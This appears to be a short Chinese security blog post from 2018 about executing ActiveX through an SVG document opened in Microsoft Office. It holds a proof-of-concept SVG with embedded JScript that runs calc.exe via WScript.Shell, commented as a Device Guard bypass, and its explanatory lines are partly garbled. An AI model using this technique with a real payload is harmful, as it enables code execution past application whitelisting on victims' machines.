---
title: SVG_ActiveX
date: 2018-09-09 18:54:16
tags: windows
categories: windows
---
![enter description here][1]

<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/SVG.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>


[1]实际上我们不需要Internet Explorer来执行ActiveX

[2]我们将使用Microsoft Office与Microsoft Office一起使用浏览器Microsoft Office通过SVG Document执行ActiveX

[3]注意此方法仅适用于Web浏览器Microsoft Office中的SVG Document

![enter description here][2]

https://homjxi0e.wordpress.com/2018/08/26/svg-document-activex-alongside-microsoft-word-execution/

https://gist.githubusercontent.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0/raw/332b3fa640bb2fff6c59b38a28eaea39b9ec5df6/x000x02.svg

``` stylus
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink" width="600" height="600">

	<script language="JScript">

		<![CDATA[
		
		<!-- Author Matt harr0ey @harr0ey
		<!-- Topic: Device Guard Bypassing
		<!-- WScript inside SVG

			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");

    ]]>
  </script>
  <rect id="square" width="0" height="0" fill="#ff0000"
   x="10" y="10" />
</svg>
```


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180909_194222.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1536493682651.jpg 